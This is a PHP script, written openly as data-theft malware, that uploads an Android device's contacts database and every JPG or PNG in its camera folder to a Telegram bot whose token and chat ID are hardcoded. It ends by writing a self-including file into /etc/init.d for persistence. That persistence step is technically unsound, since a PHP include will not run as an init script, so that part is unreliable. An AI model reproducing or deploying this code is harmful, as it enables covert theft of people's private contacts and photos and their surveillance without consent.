<?php
// Target device data paths (Android example)
$contacts_path = "/data/data/com.android.providers.contacts/databases/contacts2.db";
$photos_path = "/sdcard/DCIM/Camera/";

// Telegram bot details
$bot_token = "8254072521:AAGs0le9FRacWKgYcdk3CzHXhEiTXZb8dZU";
$chat_id = "5446862709";

// Function to send data via Telegram
function sendToTelegram($file_path, $is_photo = false) {
    global $bot_token, $chat_id;
    $url = "https://api.telegram.org/bot{$bot_token}/sendDocument";
    if ($is_photo) {
        $url = "https://api.telegram.org/bot{$bot_token}/sendPhoto";
    }
    $post_fields = [
        'chat_id' => $chat_id,
        'document' => new CURLFile($file_path)
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, 1);
    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_fields);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $result = curl_exec($ch);
    curl_close($ch);
    return $result;
}

// Exfiltrate contacts (SQLite DB)
if (file_exists($contacts_path)) {
    sendToTelegram($contacts_path);
}

// Exfiltrate photos (batch upload)
if (is_dir($photos_path)) {
    $photos = scandir($photos_path);
    foreach ($photos as $photo) {
        if (preg_match('/\.(jpg|png)$/i', $photo)) {
            sendToTelegram($photos_path . $photo, true);
        }
    }
}

// Optional: Add persistence via cronjob or startup script
file_put_contents("/etc/init.d/exfiltrate", '<?php include("' . __FILE__ . '"); ?>');
chmod("/etc/init.d/exfiltrate", 0755);
?>


